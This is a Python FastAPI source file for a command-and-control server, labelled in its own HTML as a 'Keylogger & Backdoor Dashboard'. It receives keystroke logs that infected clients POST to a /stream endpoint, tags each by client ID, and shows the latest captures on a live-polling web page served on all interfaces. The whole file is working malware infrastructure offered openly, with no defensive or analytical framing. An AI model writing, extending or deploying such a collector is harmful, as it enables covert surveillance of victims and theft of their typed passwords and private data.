from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import time

app = FastAPI()

# เก็บข้อมูล Client
clients = {}

@app.get("/")
async def dashboard():
    html = """
    <html>
    <head><title>C2 Dashboard</title></head>
    <body style="background:#111; color:#0f0; font-family:monospace;">
        <h1>Keylogger & Backdoor Dashboard</h1>
        <p>Status: <span style="color:green">Online</span></p>
        <p>Active Clients: <span id="count">0</span></p>
        <hr>
        <h3>Live Logs:</h3>
        <div id="logs" style="white-space: pre-wrap; border:1px solid #0f0; padding:10px; height:300px; overflow:auto;"></div>
    </body>
    </html>
    <script>
        // Simple polling to update UI
        setInterval(async () => {
            const res = await fetch('/api/status');
            const data = await res.json();
            document.getElementById('count').innerText = Object.keys(data.clients).length;
            let logHtml = '';
            for (let [id, logs] of Object.entries(data.clients)) {
                logHtml += `<b>${id}:</b> ${logs[logs.length-1]}<br>`;
            }
            document.getElementById('logs').innerHTML = logHtml || 'No data yet...';
        }, 2000);
    </script>
    </html>
    """
    return HTMLResponse(content=html)

@app.post("/stream")
async def receive_data(request: Request):
    body = await request.body()
    client_id = request.headers.get("X-Client-ID", "unknown")
    
    if client_id not in clients:
        clients[client_id] = []
    
    clients[client_id].append(body.decode('utf-8', errors='ignore'))
    
    # Keep only last 100 lines per client to save memory
    if len(clients[client_id]) > 100:
        clients[client_id] = clients[client_id][-100:]
        
    return {"status": "ok"}

@app.get("/api/status")
async def get_status():
    return {"status": "online", "clients": clients}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
